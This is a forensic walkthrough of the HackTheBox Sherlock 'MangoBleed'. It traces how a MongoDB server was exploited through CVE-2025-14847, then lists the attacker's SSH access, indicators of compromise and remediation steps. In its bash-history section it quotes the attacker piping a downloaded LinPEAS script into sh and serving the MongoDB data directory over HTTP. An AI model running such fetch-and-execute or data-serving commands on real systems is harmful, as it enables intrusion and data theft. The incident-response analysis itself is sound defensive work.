---
title: "MangoBleed"
description: "A walkthrough of the MangoBleed Sherlock on HTB."
tags: [Very Easy, DFIR, Linux]
sidebar_position: 1
---

# MangoBleed

**Difficulty**: Very Easy  
**Type**: DFIR

## Sherlock Scenario
You were contacted early this morning to handle a high-priority incident involving a suspected compromised server. The host, `mongodbsync`, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as **MongoBleed**. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

:::danger **CVE-2025-14847** 
The vulnerability in question is **CVE-2025-14847**, commonly known as **MongoBleed** (named after the famous Heartbleed bug due to similar memory disclosure characteristics). This is a **high-severity unauthenticated memory-leak vulnerability** (CVSS 8.7) in MongoDB Server, stemming from improper handling of zlib-compressed network messages. When zlib compression is enabled, an attacker can send specially crafted compressed packets to trigger a leak of uninitialized heap memory, potentially exposing sensitive data such as credentials, session tokens, API keys, or database contents — all without any authentication.

The flaw affects a wide range of MongoDB versions (including legacy branches back to ~2017 and recent ones up to 8.0.16), particularly when network compression is active. Exploitation is trivial with public PoCs available, and active scanning/exploitation in the wild was observed shortly after disclosure in December 2025.
:::
## Investigation
### Extracting Artifacts
We begin by extracting the provided triage archive `MangoBleed.zip` in a safe, sandboxed environment (REMnux recommended).

<figure style={{textAlign: 'center'}}>
  <img src={require('./assets/MangoBleed/extract.png').default} alt="Extracting MangoBleed.zip" style={{width: '900px'}} />
  <figcaption>Extracting the triage archive.</figcaption>
</figure>

After extraction, we find the main directory: `uac-mongodbsync-linux-triage` — a full filesystem snapshot containing critical logs and user artifacts from the compromised host.

### Determining MongoDB Version and Vulnerability Status
To check if the server was vulnerable to MongoBleed (CVE-2025-14847), we examine the APT installation history:
```bash
grep "mongodb" uac-mongodbsync-linux-triage/\[root\]/var/log/apt/history.log
```
<figure style={{textAlign: 'center'}}>
  <img src={require('./assets/MangoBleed/apt_history.png').default} alt="apt install logs" style={{width: '900px'}} />
  <figcaption>Parsing through apt install logs to find the MongoDB version.</figcaption>
</figure>

The output reveals that **MongoDB version 8.0.16** (along with related packages like mongod-org-server, mongod-org-shell, etc.) was installed — **this version is confirmed vulnerable** to CVE-2025-14847.

### Analyzing MongoDB Logs with MongoBleed Detector
To detect exploitation of CVE-2025-14847, we use the open-source **mongobleed-detector** tool by Florian Roth (Neo23x0).

First, setup steps on REMnux:
```bash
git clone https://github.com/Neo23x0/mongobleed-detector.git
cd mongobleed-detector/
chmod +x mongobleed-detector.sh ftdc-decode.py mongobleed-remote.py
pip3 install -r requirements.txt
```

The tool parses MongoDB server logs (connection events, metadata, disconnections) and applies heuristics:
- Connection count threshold
- Burst rate (connections per minute)
- Metadata rate anomalies

We analyze the MongoDB logs with a wide time window (-t 100000 minutes) to cover the entire relevant period:
```bash
./mongobleed-detector.sh "../uac-mongodbsync-linux-triage/\[root\]/var/log/mongodb/*.log" -t 100000
```

<figure style={{textAlign: 'center'}}>
  <img src={require('./assets/MangoBleed/detector-output.png').default} alt="MongoBleed Detector Results" style={{width: '1200px'}} />
  <figcaption>MongoBleed detector output showing HIGH risk exploitation.</figcaption>
</figure>

**Key findings**:
- **HIGH risk** detected from IP **65.0.76.43**
- **37,630** malicious connections
- Burst rate: **30,104 connections/min**
- First seen: **2025-12-29T05:25:52Z**
- Last seen: **2025-12-29T05:27:07Z**
- Summary: **Likely exploitation confirmed** — patching alone is insufficient; credential rotation and data review required.

This confirms active exploitation of **CVE-2025-14847** from the attacker IP.

### Confirming Successful Remote Access via auth.log
Now we correlate the attacker IP with successful logins in `/var/log/auth.log`:
```bash
grep "65.0.76.43" uac-mongodbsync-linux-triage/\[root\]/var/log/auth.log | grep "Accepted"
```
<figure style={{textAlign: 'center'}}>
  <img src={require('./assets/MangoBleed/SSH_login.png').default} alt="Attacker Login logs" style={{width: '1200px'}} />
  <figcaption>Logs that show the attacker was successfully able to compromise host and log in to it.</figcaption>
</figure>
:::danger Logs that show successful SSH logins as user **mongoadmin**:

1. 2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
:::

The attacker gained interactive shell access around **29th Dec, 2025 at 05:40:03 UTC** and remained active for approximately **8 minutes** - from **05:40:03 UTC** till **05:48:28 UTC**.
<figure style={{textAlign: 'center'}}>
  <img src={require('./assets/MangoBleed/dwell_time.png').default} alt="Attacker Dwell TIme" style={{width: '1200px'}} />
  <figcaption>Logs that show the dwell time of attacker.</figcaption>
</figure>

### Post-Compromise Activity – Bash History Analysis
We examine the bash history of the compromised user `mongoadmin`:
```bash
cat uac-mongodbsync-linux-triage/\[root\]/home/mongoadmin/.bash_history
```

<figure style={{textAlign: 'center'}}>
  <img src={require('./assets/MangoBleed/bash_history.png').default} alt="mongoadmin .bash_history" style={{width: '1000px'}} />
  <figcaption>Attacker commands executed as mongoadmin.</figcaption>
</figure>

**Attacker actions** (in chronological order):
- Enumeration: `ls -la`, `whoami`, `ls -al`, `ls /var/lib/mongodb/`, directory traversal (`cd /data`, `cd /`, `cd ..`)
- Privilege escalation reconnaissance: Downloaded and executed **LinPEAS** (in-memory script)  
  `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
- Tool installation: Installed `zip` package (`apt install zip`)
- Data staging / exfiltration preparation: Started a Python HTTP server in the MongoDB data directory  
  `cd /var/lib/mongodb/`  
  `python3 -m http.server 6969`

This strongly indicates the attacker was **enumerating the system**, **attempting privilege escalation**, **accessing the MongoDB data directory** (`/var/lib/mongodb/`), and **preparing to exfiltrate data** via a simple web server.

## MITRE ATT&CK Timeline 
| Tactic               | Technique                                 |
| -------------------- | ----------------------------------------- |
| Initial Access       | T1190 – Exploit Public-Facing Application (CVE-2025-14847) |
| Execution            | T1059.004 – Command and Scripting Interpreter: Unix Shell |
| Credential Access    | T1003 – OS Credential Dumping (memory leak via MongoBleed) |
| Discovery            | T1083 – File and Directory Discovery      |
| Discovery            | T1082 – System Information Discovery      |
| Persistence / Lateral Movement | T1078 – Valid Accounts (SSH as mongoadmin) |
| Collection           | T1567 – Exfiltration Over Web Service (potential via HTTP server) |

## Indicators of Compromise (IOCs)
| IOC Type           | Value                                            | Description                                                          |
| ------------------ | ------------------------------------------------ | -------------------------------------------------------------------- |
| Vulnerability      | CVE-2025-14847 (MongoBleed)                      | Unauthenticated memory leak in MongoDB zlib compression              |
| Affected Version   | MongoDB 8.0.16                                   | Installed vulnerable version                                         |
| Attacker IP        | `65.0.76.43`                                     | Source of exploitation and SSH access                                |
| Malicious Connections | **37,630** (total)                             | Detected in MongoDB logs during exploitation                         |
| Exploitation Start | 2025-12-29T05:25:52Z                             | Earliest confirmed malicious activity                                |
| SSH Access Time    | ~2025-12-29T05:39–05:40 UTC                      | Successful login as mongoadmin                                       |
| Persistence Tool   | linpeas.sh                                       | Downloaded from GitHub for privilege escalation enumeration          |
| Exfil Server       | Python HTTP server on port 6969 in /var/lib/mongodb/ | Likely for data staging/exfiltration                                 |
| Target Directory   | `/var/lib/mongodb/`                              | Attacker's primary interest – MongoDB data files                     |

## Attack Timeline Summary
| Time (UTC)                  | Event                                                        |
| --------------------------- | ------------------------------------------------------------ |
| 2025-12-29T05:25:52Z        | Exploitation of CVE-2025-14847 (MongoBleed) begins from 65.0.76.43 |
| ~05:39–05:40 UTC            | Attacker gains SSH access as user mongoadmin                 |
| During 8-minute session     | Enumeration, LinPEAS execution, zip installation, directory traversal |
| Session end                 | Attacker starts Python HTTP server in MongoDB data dir for potential exfiltration |

**Initial Assessment & Recommendations**  
The system was **compromised via CVE-2025-14847 (MongoBleed)**, followed by **credential compromise** (likely from leaked secrets), **successful SSH access**, **post-exploitation enumeration**, and **preparation for data exfiltration**.  

**Immediate actions**:
- Isolate the host
- Rotate **all** credentials (MongoDB, SSH, application)
- Patch to a fixed MongoDB version (≥8.0.17)
- Review `/var/lib/mongodb/` for data tampering / exfiltration
- Collect full forensic image for deeper analysis
- Scan network for lateral movement indicators
